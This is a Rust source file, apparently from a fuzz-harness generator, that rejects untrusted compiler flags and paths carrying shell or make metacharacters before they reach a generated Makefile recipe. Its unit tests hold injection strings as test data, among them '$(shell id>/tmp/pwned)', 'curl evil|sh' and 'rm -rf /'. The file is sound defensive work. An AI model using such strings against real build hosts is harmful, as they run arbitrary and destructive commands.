// SPDX-License-Identifier: Apache-2.0
//! Refuse untrusted build inputs that could inject commands into a
//! generated Makefile recipe.
//!
//! C/C++ harness Makefiles interpolate compile flags, source paths,
//! and include directories straight into `$(CC) ... ` recipe lines.
//! Those strings come from the scanned (untrusted) tree and its
//! `compile_commands.json`. `make` expands `$(...)`/`${...}` and the
//! shell then parses the recipe, so a flag like `-DX=$(shell id)` or
//! a source path containing a backtick/`;`/newline is arbitrary
//! command execution on the analyst's host. We reject any such token
//! before it can reach the template.

use crate::error::HarnessGenError;

/// Characters that have no legitimate place in a compiler flag,
/// include directory, or source path but enable make/shell injection.
/// Whitespace is included because an unquoted space in a recipe
/// splits one token into several arguments.
///
/// On Unix the recipe is parsed by `/bin/sh`. On Windows the recipe is parsed by
/// `cmd.exe` and paths are backslash-separated, contain drive colons, the `\\?\`
/// verbatim prefix (`?`), and parentheses (`C:\Program Files (x86)\...`) — none of
/// which `cmd` treats as operators in argument position. So the Windows set keeps
/// only the genuine `cmd`/`make` injection characters and lets ordinary Windows
/// path characters through. (`make`'s own `$`/`#` stay forbidden on both.)
#[cfg(not(windows))]
const FORBIDDEN: &[char] = &[
    '$', '`', ';', '|', '&', '(', ')', '<', '>', '*', '?', '{', '}', '[', ']', '~', '!', '#', '\'',
    '"', '\\', ' ', '\t', '\n', '\r',
];
#[cfg(windows)]
const FORBIDDEN: &[char] = &[
    '$', '`', ';', '|', '&', '<', '>', '^', '%', '"', '#', ' ', '\t', '\n', '\r',
];

/// True when `value` is safe to interpolate into a Makefile recipe.
pub fn is_build_input_safe(value: &str) -> bool {
    if !value
        .chars()
        .any(|c| c.is_control() || FORBIDDEN.contains(&c))
    {
        return true;
    }
    // A quoted string-macro define is the one common, legitimate use of double
    // quotes — `-DREVISION_ID="lib-1.2.3"`, `-DPACKAGE="my app"` — emitted by CMake
    // (`target_compile_definitions(... NAME="${VAR}")`). The wrapping quotes, and
    // the spaces they protect, are safe; rejecting them blocks the whole project.
    is_quoted_define_safe(value)
}

/// A `-D<NAME>=...="<content>"` define whose ONLY metacharacters are a single
/// balanced pair of wrapping double quotes (and spaces inside them, which the
/// quotes protect from word-splitting). Everything outside the quotes must pass
/// the ordinary check, and the quoted content must still be free of characters
/// that `make`/the shell act on *before* quote parsing — `$` (make/shell
/// expansion), a backtick (command substitution), a backslash (escape), an inner
/// quote, or a newline — so no command injection slips through the relaxation.
fn is_quoted_define_safe(value: &str) -> bool {
    if !value.starts_with("-D") {
        return false;
    }
    if value.matches('"').count() != 2 {
        return false;
    }
    let first = value.find('"').unwrap();
    let last = value.rfind('"').unwrap();
    let before = &value[..first];
    let inside = &value[first + 1..last];
    if !value[last + 1..].is_empty() {
        return false; // trailing junk after the closing quote
    }
    if !is_build_input_safe(before) {
        return false;
    }
    const DANGEROUS_IN_QUOTES: &[char] = &['$', '`', '\\', '"', '\n', '\r'];
    !inside
        .chars()
        .any(|c| c.is_control() || DANGEROUS_IN_QUOTES.contains(&c))
}

/// Validate one untrusted build-input token, returning a descriptive
/// `UnsafeBuildInput` error when it contains a metacharacter.
pub fn ensure_build_input_safe(kind: &str, value: &str) -> Result<(), HarnessGenError> {
    if is_build_input_safe(value) {
        return Ok(());
    }
    Err(HarnessGenError::UnsafeBuildInput(format!(
        "refusing to generate harness: {kind} {value:?} contains a shell/make \
         metacharacter and could inject commands into the build recipe"
    )))
}

/// Validate every token in an iterator of untrusted build inputs.
pub fn ensure_all_build_inputs_safe<'a, I>(kind: &str, values: I) -> Result<(), HarnessGenError>
where
    I: IntoIterator<Item = &'a str>,
{
    for value in values {
        ensure_build_input_safe(kind, value)?;
    }
    Ok(())
}

/// Render a path for interpolation into a generated Makefile recipe / compile
/// command. On Windows this strips the `\\?\` (and `\\?\UNC\`) verbatim prefix
/// and converts `\` to `/`: GNU make runs recipes through `sh`, which eats
/// backslashes, and a drive-letter colon in a target/prerequisite breaks rule
/// parsing — while clang/cl happily accept forward-slash paths (`C:/foo/bar.c`).
/// On other platforms it is the plain display string.
pub fn make_path(p: &std::path::Path) -> String {
    let s = p.display().to_string();
    #[cfg(windows)]
    {
        let stripped = s
            .strip_prefix(r"\\?\UNC\")
            .map(|rest| format!(r"\\{rest}"))
            .or_else(|| s.strip_prefix(r"\\?\").map(str::to_owned))
            .unwrap_or(s);
        return stripped.replace('\\', "/");
    }
    #[cfg(not(windows))]
    {
        s
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn accepts_ordinary_flags_and_paths() {
        for ok in [
            "-I/usr/include",
            "-DVERSION=3",
            "-std=gnu++17",
            "/home/user/proj/src/miniz.c",
            "-pthread",
            "--gcc-toolchain=/opt/gcc",
        ] {
            assert!(is_build_input_safe(ok), "{ok:?} should be allowed");
        }
    }

    #[test]
    fn rejects_command_injection_vectors() {
        for bad in [
            "-DX=y$(shell id>/tmp/pwned)",
            "-DX=`id`",
            "src/a;curl evil|sh.c",
            "-DX=y\nrun: ; id",
            "/path/with a space.c",
            "-DX=${HOME}",
        ] {
            assert!(!is_build_input_safe(bad), "{bad:?} should be rejected");
            assert!(ensure_build_input_safe("flag", bad).is_err());
        }
    }

    #[test]
    fn accepts_well_formed_quoted_string_defines() {
        // CMake `target_compile_definitions(lib NAME="${VAR}")` lands here.
        for ok in [
            "-DREVISION_ID=\"E57Format-3.3.0-x86_64-gcc13\"",
            "-DPACKAGE=\"my app\"", // a space inside the quotes is protected
            "-DGIT_SHA=\"abc123\"",
            "-DPATH_HINT=\"/usr/local/share\"",
        ] {
            assert!(is_build_input_safe(ok), "{ok:?} should be allowed");
        }
    }

    #[test]
    fn rejects_injection_disguised_as_a_quoted_define() {
        for bad in [
            "-DX=\"$(id)\"",         // make/shell expansion inside quotes
            "-DX=\"`id`\"",          // command substitution inside quotes
            "-DX=\"a\";id;\"b\"",    // breaks out with extra quotes/`;`
            "-DX=\"a\\\";id;\\\"\"", // escaped-quote shenanigans
            "-DX=\"a\"; rm -rf /",   // trailing junk after the closing quote
            "-DX=\"a",               // unbalanced quote
            "VERSION=\"3\"",         // not a -D flag
        ] {
            assert!(!is_build_input_safe(bad), "{bad:?} should be rejected");
        }
    }
}
